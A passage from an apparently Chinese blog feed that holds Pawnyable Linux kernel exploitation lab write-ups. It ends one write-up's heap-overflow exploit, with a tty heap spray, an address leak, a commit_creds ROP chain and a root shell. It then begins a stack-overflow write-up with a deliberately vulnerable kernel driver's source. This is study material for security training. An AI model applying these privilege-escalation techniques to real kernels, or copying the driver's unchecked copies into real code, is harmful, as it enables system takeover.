punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>commit_creds_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"swapgs;"</span><span class="token string">"push %0;"</span><span class="token string">"push %1;"</span><span class="token string">"push %2;"</span><span class="token string">"push %3;"</span><span class="token string">"push %4;"</span><span class="token string">"iretq;"</span><span class="token operator">:</span><span class="token operator">:</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>getRootShell<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">/*leak*/</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x450</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x450</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0xc38880</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> heap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x438</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x438</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] heap => 0x%lx\n"</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//g_buf</span>prepare_kernel_cred_addr<span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>commit_creds_addr<span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span>koff<span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVESQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">=</span>heap<span class="token punctuation">;</span><span class="token comment">//overflow ops</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token operator">=</span>PUSH_RDX_POP_RSP_PP_RET<span class="token punctuation">;</span><span class="token comment">//rip</span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x420</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heap<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/9e48d923aa5ec4f36ee9f13aea8782e3_MD5.jpeg"></p><blockquote><p>附件：<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-2.tar.gz">LK01-2.tar.gz</a><br>参考文章：<a href="https://blog.wohin.me/posts/pawnyable-0202/">Linux Kernel PWN | 040202 Pawnyable之堆溢出 (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/heap_overflow.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v2：利用堆溢出 | PAWNYABLE！ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pawnyable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01 Holstein v1 栈溢出</title>
      <link href="/2024/01/27/LK01%20Holstein%20v1%20%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2024/01/27/LK01%20Holstein%20v1%20%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>LKM源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v1 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                        <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                        <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> kbuf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>kbuf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> kbuf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> kbuf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_copy_from_user</span><span class="token punctuation">(</span>kbuf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> kbuf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile：</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O0<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用的是5.10.7的内核，CONFIG_STACKPROTECTOR&#x3D;n</p><h1 id="一、LK01-Holstein-v1"><a href="#一、LK01-Holstein-v1" class="headerlink" title="一、LK01 Holstein v1"></a>一、LK01 Holstein v1</h1><h2 id="一-程序分析"><a href="#一-程序分析" class="headerlink" title="(一)程序分析"></a>(一)程序分析</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看一下rcS：发现是相继执行init.d下的所有shell脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment"># Start all init scripts in /etc/init.d</span><span class="token comment"># executing them in numerical order.</span><span class="token comment">#</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> /etc/init.d/S??* <span class="token punctuation">;</span><span class="token keyword">do</span>     <span class="token comment"># Ignore dangling symlinks (if any).</span>     <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">continue</span>     <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token keyword">in</span>*.sh<span class="token punctuation">)</span>    <span class="token comment"># Source shell script for speed.</span>    <span class="token punctuation">(</span><span class="token builtin class-name">trap</span> - INT QUIT TSTP<span class="token builtin class-name">set</span> start<span class="token builtin class-name">.</span> <span class="token variable">$i</span>    <span class="token punctuation">)</span>    <span class="token punctuation">;</span><span class="token punctuation">;</span>*<span class="token punctuation">)</span>    <span class="token comment"># No sh extension, so fork subprocess.</span>    <span class="token variable">$i</span> start    <span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">esac</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在S99pawnyable中有如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment">##</span><span class="token comment">## Setup</span><span class="token comment">##</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> 